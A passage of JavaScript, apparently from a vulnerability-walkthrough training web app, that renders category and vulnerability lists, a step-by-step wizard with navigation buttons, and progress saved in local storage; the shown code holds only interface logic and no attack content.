        <li class="breadcrumb-item"><a href="#" onclick="showCategories();return false;">Categories</a></li>
        <li class="breadcrumb-item active">${cat.name}</li>`;
    document.getElementById('vuln-list-intro').textContent = cat.description;

    const list = document.getElementById('vuln-list');
    const completed = getCompleted();
    list.innerHTML = '';
    cat.vulns.forEach(v => {
        const done = completed.includes(v.id);
        const hasAuto = v.steps.length >= 7;
        const div = document.createElement('div');
        div.className = 'wt-vuln-item' + (done ? ' completed' : '');
        div.onclick = () => showWizard(v.id);
        div.innerHTML = `
            <div>
                <span class="wt-difficulty wt-difficulty-${v.difficulty.toLowerCase()}">${v.difficulty}</span>
                <strong class="ms-2">${v.name}</strong>
                ${hasAuto ? '<span class="wt-auto-badge ms-2"><i class="bi bi-robot"></i> Automate</span>' : ''}
            </div>
            <div>
                ${done ? '<i class="bi bi-check-circle-fill text-success me-2"></i>' : ''}
                <i class="bi bi-chevron-right text-muted"></i>
            </div>`;
        list.appendChild(div);
    });
}

function showWizard(vulnId) {
    let vuln = null, cat = null;
    for (const c of WALKTHROUGH_DATA.categories) {
        const v = c.vulns.find(x => x.id === vulnId);
        if (v) { vuln = v; cat = c; break; }
    }
    if (!vuln) return;
    currentCategory = cat;
    currentVuln = vuln;
    currentStep = 0;

    document.getElementById('view-categories').style.display = 'none';
    document.getElementById('view-vulns').style.display = 'none';
    document.getElementById('view-wizard').style.display = '';
    document.getElementById('breadcrumb-list').innerHTML = `
        <li class="breadcrumb-item"><a href="#" onclick="showCategories();return false;">Categories</a></li>
        <li class="breadcrumb-item"><a href="#" onclick="showVulns('${cat.id}');return false;">${cat.name}</a></li>
        <li class="breadcrumb-item active">${vuln.name}</li>`;
    renderStep();
}

function renderStep() {
    const indicator = document.getElementById('step-indicator');
    let html = '';
    const totalSteps = currentVuln.steps.length;
    const hasAuto = totalSteps >= 7;
    for (let i = 0; i < totalSteps; i++) {
        const isAutoStep = hasAuto && i === totalSteps - 1;
        if (i > 0) html += `<div class="wt-step-line ${i <= currentStep ? 'visited' : ''}"></div>`;
        const cls = (i === currentStep ? 'active' : (i < currentStep ? 'visited' : '')) + (isAutoStep ? ' auto-step' : '');
        const label = isAutoStep ? '<i class="bi bi-robot"></i>' : (i+1);
        html += `<div class="wt-step-dot ${cls}" onclick="goToStep(${i})" title="${STEP_ICONS[i].title}">${label}</div>`;
    }
    indicator.innerHTML = html;

    const step = STEP_ICONS[currentStep];
    document.getElementById('step-content').innerHTML = `
        <h4><i class="bi ${step.icon}"></i> Step ${currentStep+1}: ${step.title}</h4>
        ${currentVuln.steps[currentStep]}`;

    const lastStep = currentVuln.steps.length - 1;
    document.getElementById('btn-prev').style.display = currentStep === 0 ? 'none' : '';
    document.getElementById('btn-next').style.display = currentStep === lastStep ? 'none' : '';
    document.getElementById('btn-complete').style.display = currentStep === lastStep ? '' : 'none';

    if (isCompleted(currentVuln.id)) {
        document.getElementById('btn-complete').innerHTML = '<i class="bi bi-check-circle-fill"></i> Completed!';
        document.getElementById('btn-complete').className = 'btn btn-outline-success';
        document.getElementById('btn-complete').disabled = true;
    } else {
        document.getElementById('btn-complete').innerHTML = '<i class="bi bi-check-circle"></i> Mark Complete';
        document.getElementById('btn-complete').className = 'btn btn-success';
        document.getElementById('btn-complete').disabled = false;
    }
}

function goToStep(n) { currentStep = n; renderStep(); }
function nextStep() { if (currentStep < currentVuln.steps.length - 1) { currentStep++; renderStep(); } }
function prevStep() { if (currentStep > 0) { currentStep--; renderStep(); } }

function markComplete() {
    if (!currentVuln) return;
    setCompleted(currentVuln.id);
    renderStep();
    updateOverall();
}

function resetProgress() {
    if (confirm('Reset all walkthrough progress? This cannot be undone.')) {
        localStorage.removeItem(STORAGE_KEY);
        showCategories();
    }
}

showCategories();
</script>
